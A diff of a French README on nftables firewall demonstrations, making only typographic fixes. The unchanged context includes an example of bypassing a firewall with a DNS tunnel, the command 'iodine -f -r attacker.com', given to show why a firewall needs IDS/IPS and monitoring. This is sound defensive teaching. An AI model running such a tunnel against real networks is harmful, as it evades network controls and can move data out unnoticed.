@@ -70,7 +70,7 @@ Les démonstrations portent sur les niveaux suivants :
 
 #  Démonstrations
 
-➡️ **Application des règles** : Mise en place et exécution des règles de filtrage via nftables afin de contrôler le trafic réseau (entrées, sorties, redirections).
+➡️ **Application des règles** : mise en place et exécution des règles de filtrage via nftables afin de contrôler le trafic réseau (entrées, sorties, redirections).
 
 ---
 # ⚠️ Limites et bonnes pratiques
@@ -111,7 +111,7 @@ il faut le **combiner avec IDS/IPS + monitoring**.
 
 ---
 
-### 📌 Exemple : Tunnel DNS (contournement)
+### 📌 Exemple : tunnel DNS (contournement)
 
 Comme le port **53 (DNS)** est ouvert, un attaquant peut établir un tunnel DNS :
 
@@ -119,11 +119,11 @@ iodine -f -r attacker.com
 
 ---
 
-#  Différence entre Niveau 6 et Niveau 7
+#  Différences entre les niveaux 6 et 7
 
 ### 🔹 Niveau 6 : Pare-feu personnel
 - Protège uniquement **ta machine locale**.
-- Applique une politique stricte : **tout est bloqué sauf quelques services essentiels**.
+- Applique une politique stricte : **tout est bloqué, sauf quelques services essentiels**.
 - Idéal pour un **poste de travail** ou un **serveur isolé**.
 
 👉 **Exemple :** ton PC sous Parrot OS n’accepte que le trafic **web** et **SSH**.
